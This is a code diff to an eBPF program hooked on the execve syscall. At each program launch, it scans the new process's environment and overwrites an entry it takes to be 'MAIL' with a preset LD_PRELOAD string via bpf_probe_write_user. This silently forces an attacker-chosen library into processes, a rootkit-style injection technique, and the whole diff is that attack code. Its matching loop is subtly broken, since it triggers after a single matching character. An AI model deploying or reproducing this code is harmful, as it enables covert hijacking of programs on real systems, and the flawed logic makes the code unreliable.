@@ -332,16 +332,30 @@ const volatile char ld_preload[LD_PRELOAD_MAX_LEN];
 SEC("tracepoint/syscalls/sys_enter_execve")
 int tracepoint__syscalls__sys_enter_execve(struct trace_event_raw_sys_enter *ctx)
 {   
-    bpf_printk("FILENAME: %s", ctx->args[0]);
-    bpf_printk("ARGV: 0x%lx", ctx->args[1]);
-    bpf_printk("ENVP: 0x%lx", ctx->args[2]);
+    // bpf_printk("FILENAME: %s", ctx->args[0]);
+    // bpf_printk("ARGV: 0x%lx", ctx->args[1]);
+    // bpf_printk("ENVP: 0x%lx", ctx->args[2]);
 
     char **envp_dbl_ptr = (char**)BPF_CORE_READ(ctx, args[2]); /* ctx->args[2] */
     char *envp_ptr = NULL;
 	
-    bpf_probe_read_user(&envp_ptr, sizeof(unsigned long), envp_dbl_ptr);
-    bpf_probe_write_user(envp_ptr, &ld_preload, sizeof(ld_preload));
+    static const char target[] = "MAIL";
+    const char tmp[100] = { 0 };
 
+    for (u32 i = 0; i < 24; i++) {
+        bpf_probe_read_user(&envp_ptr, sizeof(unsigned long), envp_dbl_ptr + (i * sizeof(char*)));
+        bpf_probe_read_user_str(&tmp, sizeof(tmp), envp_ptr);
+        for (u32 j = 0; j < sizeof(target); j++) {
+            if (tmp[j] != target[j])
+                break;
+            goto out;
+        }
+    }
+    return 0;
+
+out:
+    /* only hit this if env_ptr is MAIL */
+    bpf_probe_write_user(envp_ptr, &ld_preload, sizeof(ld_preload));
     return 0;
 }
 
